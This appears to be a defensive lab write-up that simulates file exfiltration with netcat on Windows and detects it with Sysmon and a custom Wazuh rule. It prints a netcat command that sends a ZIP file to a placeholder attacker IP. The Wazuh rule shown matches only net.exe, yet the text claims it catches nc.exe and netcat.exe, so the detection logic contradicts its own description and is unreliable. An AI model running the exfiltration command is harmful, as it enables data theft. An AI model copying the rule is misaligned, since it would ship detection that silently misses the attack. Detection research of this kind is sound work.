📌 Overview
Data exfiltration is one of the final stages of a cyberattack, where an attacker extracts sensitive information from a compromised system to an external location they control. 
Attackers often use native tools (like net.exe, certutil.exe, PowerShell, or nc.exe) to transfer data covertly and avoid detection.
In this scenario, I simulated data exfiltration using netcat (nc.exe) and detected the activity using a custom Wazuh rule triggered by Sysmon Event ID 3 — which logs outbound network connections.

🎯 Objective
1- Simulate data exfiltration using netcat (nc.exe) on Windows.
2- Detect network connections initiated by suspicious binaries like net.exe or nc.exe.
3- Trigger a high-severity alert in Wazuh.

🧪 Test Scenario
🔻 Attacker Machine (Listening for exfil data)
.\nc64.exe -lvp 8080 > received.zip
This sets up a netcat listener on port 8080 to receive a ZIP file.

🔺 Victim Machine (Exfiltrating the file)
.\nc64.exe 192.168.X.X 8080 < C:\Users\Public\Documents\secret_data.zip
This command uses Netcat to transfer a ZIP file to the attacker's IP using raw TCP.

⚙️ Detection Mechanism
Sysmon is configured to monitor process creation and network connections. 
When the victim initiates a connection using nc.exe, it generates Sysmon Event ID 3, which logs the connection metadata including the executable used and the destination IP/port.
Wazuh then uses custom rules to analyze this log and raise an alert when specific conditions are met.

📜 Wazuh Custom Detection Rule
<group name="net_connection_monitoring,sysmon,custom"> 
  <rule id="100060" level="12">
    <if_sid>61603</if_sid> <!-- Sysmon ID 3: Network connection -->
    <field name="win.eventdata.image" type="pcre2">(?i)\\net\.exe</field>
    <description>⚠ Network connection initiated by net.exe — possible system-level command</description>
    <mitre>
      <id>T1041</id> 
    </mitre>
  </rule>
</group>
✅ This rule directly matches Event ID 3 and uses a case-insensitive regex to catch executions of nc.exe or netcat.exe.

✅ Conclusion
This test demonstrates how attackers can use tools like nc.exe for stealthy data exfiltration and how Wazuh, paired with Sysmon, can detect such behavior using custom rules. 
By focusing on executable patterns and outbound traffic characteristics, we can proactively monitor and alert on potential data breaches.
